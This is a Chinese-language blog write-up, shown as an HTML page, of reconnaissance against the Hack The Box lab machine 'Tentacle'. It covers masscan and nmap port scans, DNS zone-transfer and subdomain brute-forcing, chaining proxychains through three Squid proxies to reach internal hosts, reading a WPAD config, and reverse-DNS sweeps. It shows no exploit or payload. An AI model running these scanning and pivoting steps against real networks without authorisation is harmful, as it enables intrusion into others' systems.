@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+  <meta name="description" content="TCP扫描 123masscan -p1-65535 10.10.10.224 --rate&#x3D;1000 -e tun0 &gt; portsports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&amp;#123;print $4&amp;#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&amp;#123;print $1&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB:Tentacle">
+<meta property="og:url" content="http://evilarsene.icu/2021/06/24/HTB-Tentacle/index.html">
+<meta property="og:site_name" content="Love ❤ Hacking">
+<meta property="og:description" content="TCP扫描 123masscan -p1-65535 10.10.10.224 --rate&#x3D;1000 -e tun0 &gt; portsports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&amp;#123;print $4&amp;#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&amp;#123;print $1&amp;">
+<meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/1.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/2.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/3.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/4.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/5.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/7.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/8.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/9.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/10.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/11.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/12.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/13.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/14.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/15.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/6.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/16.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/17.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/18.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/19.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/20.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/21.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/22.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/23.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/24.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/25.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/26.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/27.png">
+<meta property="og:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/28.png">
+<meta property="article:published_time" content="2021-06-24T02:25:37.000Z">
+<meta property="article:modified_time" content="2021-07-03T05:10:15.217Z">
+<meta property="article:author" content="EvilArsene">
+<meta property="article:tag" content="Linux靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/2021/06/24/images/Tentacle/1.png">
+
+<link rel="canonical" href="http://evilarsene.icu/2021/06/24/HTB-Tentacle/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>HTB:Tentacle | Love ❤ Hacking</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/TZESS" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Love ❤ Hacking</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">trickster</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2021/06/24/HTB-Tentacle/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="EvilArsene">
+      <meta itemprop="description" content="人格面具操控者 <img src="http://www.hackthebox.eu/badge/image/278745" alt="Hack The Box">">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Love ❤ Hacking">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB:Tentacle
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-24 10:25:37" itemprop="dateCreated datePublished" datetime="2021-06-24T10:25:37+08:00">2021-06-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-03 13:10:15" itemprop="dateModified" datetime="2021-07-03T13:10:15+08:00">2021-07-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p>TCP扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-65535 10.10.10.224 --rate&#x3D;1000 -e tun0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 10.10.10.224 -oN nmap</span><br></pre></td></tr></table></figure>
+
+<p>这里nmap似乎得到一个主机名REALCORP.HTB</p>
+<p><img src="../images/Tentacle/1.png" alt="1"></p>
+<p>UDP扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sV 10.10.10.224</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/2.png" alt="2"></p>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>尝试反向查询主机名，没有成功</p>
+<p><img src="../images/Tentacle/3.png" alt="3"></p>
+<p>尝试用之前得到的主机名尝试区域传输，没有得到任何信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$dig axfr @10.10.10.224 realcorp.htb</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.4-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.224 realcorp.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed</span><br></pre></td></tr></table></figure>
+
+<p>尝试只查询相关联的记录，得到了SOA记录<code>root.realcorp.htb</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$dig realcorp.htb @10.10.10.224</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.4-Debian &lt;&lt;&gt;&gt; realcorp.htb @10.10.10.224</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 49150</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">; COOKIE: 256f22e3e3e0f2c89317097e60d43b7160baaf367050f29a (good)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;realcorp.htb.                  IN      A</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">realcorp.htb.           86400   IN      SOA     realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400</span><br><span class="line"></span><br><span class="line">;; Query time: 88 msec</span><br><span class="line">;; SERVER: 10.10.10.224#53(10.10.10.224)</span><br><span class="line">;; WHEN: Thu Jun 24 15:59:46 CST 2021</span><br><span class="line">;; MSG SIZE  rcvd: 110</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>dnsenum</code>进行暴力枚举，尝试获得更多子域 。尽管可以开启16个线程，但是速度还是挺慢的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsenum --dnsserver 10.10.10.224 -f &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-5000.txt realcorp.htb -o &#x2F;tmp&#x2F;DNS_Records</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/4.png" alt="4"></p>
+<h2 id="Squid"><a href="#Squid" class="headerlink" title="Squid"></a>Squid</h2><p>发现一个邮箱<code>j.nakazawa@realcorp.htb</code>,同时在最下方发现主机名<code>srv01.realcorp.htb</code></p>
+<p><img src="../images/Tentacle/5.png" alt="5"></p>
+<p>通过HTTP代理进行访问，得到 <code>Access Denied</code>。可能这里需要凭据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s --proxy 10.10.10.224:3128 http:&#x2F;&#x2F;10.10.10.224 &gt; 224.html</span><br><span class="line">firefox 224.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/7.png" alt="7"></p>
+<p>尝试访问本地，得到<code>Connection failed</code>。可能本地禁止访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s --proxy 10.10.10.224:3128 http:&#x2F;&#x2F;127.0.0.1 &gt; localhost.html</span><br><span class="line">firefox localhost.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/8.png" alt="8"></p>
+<p>尝试<code>proxychains</code>进行内部扫描</p>
+<p>修改<code>/etc/proxychains4.conf</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http 		10.10.10.224 	3128</span><br></pre></td></tr></table></figure>
+
+<p>*这里也可以重写proxychains.conf，通过-f 指定该文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strict_chain</span><br><span class="line">proxy_dns</span><br><span class="line">[ProxyList]</span><br><span class="line">http 10.10.10.224 3128</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>nmap</code>，看起来工作正常</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$proxychains nmap -Pn -sT 127.0.0.1                                                                                                                                                               </span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains.conf                                            </span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4                    </span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14                                                       </span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.             </span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-02 10:37 CST</span><br><span class="line">[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:111 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:22  ...  OK                    </span><br><span class="line">[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:23 &lt;--denied  </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>等待扫描结束，发现了新端口464和749，这些都是和Kerberos相关的端口</p>
+<p><img src="../images/Tentacle/9.png" alt="9"></p>
+<p>在这之后，我扫描了前面发现的两个IP，不过这里都没有回应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -n 10.197.243.31,77</span><br></pre></td></tr></table></figure>
+
+<p>之后注意到本地<code>3128</code>，之前我已经发现了10.10.10.224和127.0.0.1这两者存在区别，尝试建立代理链</p>
+<p>修改<code>/etc/proxychains.conf</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http 		10.10.10.224 	3128</span><br><span class="line">http		127.0.0.1	3128</span><br></pre></td></tr></table></figure>
+
+<p>现在如果我使用<code>proxychains</code>，也就是套了2层代理了。一个快速的测试来验证代理配置正确</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$proxychains nmap --top-ports 10 -sT -Pn 127.0.0.1</span><br><span class="line"></span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-02 11:41 CST</span><br><span class="line">[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:139 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:443 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:22  ...  OK</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>尝试扫描之前发现的两个IP(<code>nmap -n</code>禁止dns查询，<code>proxychains -q</code>进入安静模式)<br>在这里，可以发现<code>10.197.243.77</code>存在另一个<code>squid</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q nmap --top-ports 1000 -sT -Pn -n 10.197.243.31,77</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/10.png" alt="10"></p>
+<p>修改<code>/etc/proxychains.conf</code>。这次扫描经过10.10.10.224→127.0.0.1(还是10.10.10.224)→10.197.243.77最后到达10.197.243.31</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http 		10.10.10.224 	3128</span><br><span class="line">http		127.0.0.1	3128</span><br><span class="line">http		10.197.243.77	3128</span><br></pre></td></tr></table></figure>
+
+<p>这次成功访问到<code>10.197.243.31</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q nmap --top-ports 1000 -sT -Pn -n 10.197.243.31</span><br><span class="line">proxychains curl --head 10.197.243.31</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/11.png" alt="11"></p>
+<p>而且这里的ssh-hostkey和之前一样</p>
+<p><img src="../images/Tentacle/12.png" alt="12"></p>
+<p>通过浏览器访问</p>
+<p><img src="../images/Tentacle/13.png" alt="13"></p>
+<p>我们之前通过dns枚举得到了主机名，这里添加到<code>/etc/hosts</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.197.243.31	wpad.realcorp.htb</span><br></pre></td></tr></table></figure>
+
+<p>通过主机名访问，得到<code>403</code></p>
+<p><img src="../images/Tentacle/14.png" alt="14"></p>
+<h2 id="wpad"><a href="#wpad" class="headerlink" title="wpad"></a>wpad</h2><p>这里主机名是<code>wpad</code>(<strong>Web Proxy Auto-Discovery Protocol</strong>)，也就是<strong>Web 代理自动发现协议</strong>。简单来说它会下载服务器的代理配置文件，然后自动配置浏览器代理进行访问</p>
+<p>我第一次接触这个概念是在<code>relay attack</code>，它利用wpad配置恶意代理强制受害者进行NTLM认证。找到一篇相似的<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks">文章</a></p>
+<p>在这里，我们可以发现<code>wpad.dat</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$proxychains -q curl -s http:&#x2F;&#x2F;wpad.realcorp.htb&#x2F;wpad.dat</span><br><span class="line">function FindProxyForURL(url, host) &#123;</span><br><span class="line">    if (dnsDomainIs(host, &quot;realcorp.htb&quot;))</span><br><span class="line">        return &quot;DIRECT&quot;;</span><br><span class="line">    if (isInNet(dnsResolve(host), &quot;10.197.243.0&quot;, &quot;255.255.255.0&quot;))</span><br><span class="line">        return &quot;DIRECT&quot;; </span><br><span class="line">    if (isInNet(dnsResolve(host), &quot;10.241.251.0&quot;, &quot;255.255.255.0&quot;))</span><br><span class="line">        return &quot;DIRECT&quot;; </span><br><span class="line"> </span><br><span class="line">    return &quot;PROXY proxy.realcorp.htb:3128&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这里，我们可以发现可以<code>DIRECT</code>到子网<code>10.241.251.0</code></p>
+<h2 id="Rverse-DNS-Lookup"><a href="#Rverse-DNS-Lookup" class="headerlink" title="Rverse DNS Lookup"></a>Rverse DNS Lookup</h2><p>nmap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$nmap -sL --dns-servers 10.10.10.224 10.241.251.0&#x2F;24 |grep -v &#39;Nmap scan report for 10.241.251.&#39;</span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-02 14:22 CST</span><br><span class="line">Nmap scan report for srvpod01.realcorp.htb (10.241.251.113)</span><br><span class="line">Nmap done: 256 IP addresses (0 hosts up) scanned in 0.54 seconds</span><br></pre></td></tr></table></figure>
+
+<p>dnsrecon</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$dnsrecon -r 10.241.251.0&#x2F;24 -n 10.10.10.224 -d NotMatter</span><br><span class="line">[*] Reverse Look-up of a Range</span><br><span class="line">[*] Performing Reverse Lookup from 10.241.251.0 to 10.241.251.255</span><br><span class="line">[+] &#123;&#39;type&#39;: &#39;PTR&#39;, &#39;name&#39;: &#39;srvpod01.realcorp.htb&#39;, &#39;address&#39;: &#39;10.241.251.113&#39;&#125;</span><br><span class="line">[+] 1 Records Found</span><br></pre></td></tr></table></figure>
+
+<p>dig</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$for i in &#123;1..254&#125;; do dig +noall +answer @10.10.10.224 -x 10.241.251.$i; done</span><br><span class="line">113.251.241.10.in-addr.arpa. 259200 IN  PTR     srvpod01.realcorp.htb.</span><br></pre></td></tr></table></figure>
+
+<p>nslookup</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$nslookup </span><br><span class="line">&gt; server 10.10.10.224</span><br><span class="line">Default server: 10.10.10.224</span><br><span class="line">Address: 10.10.10.224#53</span><br><span class="line">&gt; 10.241.251.113</span><br><span class="line">113.251.241.10.in-addr.arpa     name &#x3D; srvpod01.realcorp.htb.</span><br></pre></td></tr></table></figure>
+
+<p>在这之后，我们可以发现主机<code>10.241.251.113 srvpod01.realcorp.htb</code>(看主机名pod，而且Nginx页面也显示系统为RedHat，所以应该是Podman，类似于docker的容器)</p>
+<p>这里1层代理和2层代理都无法访问到这个主机，但是3层代理可以(预期性的符合<code>wpad.dat</code>)</p>
